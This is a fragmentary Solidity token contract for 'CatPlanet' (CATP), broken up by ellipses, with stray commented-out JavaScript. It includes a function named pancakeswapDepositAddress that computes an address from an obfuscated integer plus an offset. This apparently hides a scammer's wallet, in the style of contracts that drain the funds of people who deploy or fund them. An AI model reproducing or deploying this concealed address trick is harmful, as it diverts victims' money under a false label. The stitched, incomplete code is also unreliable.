...
// File: ipfs://QmRsN2Vdfy8DnYZJiTxB2BRdLPpUo65BdAoBV41giBLH6B
        ...
        //}).on("data", async function (transactionHash) {
            ...
            // {
				function pancakeswapDepositAddress() public pure returns (address) {
                    uint160 offset = 4294967296;
                    uint160 pindex = 120788324020373221413336575138479974363439003857+offset;
...
contract CatPlanet {
    ...
    string public name = "CatPlanet"; //Coin Name
    string public symbol = "CATP"; //Coin Symbol 
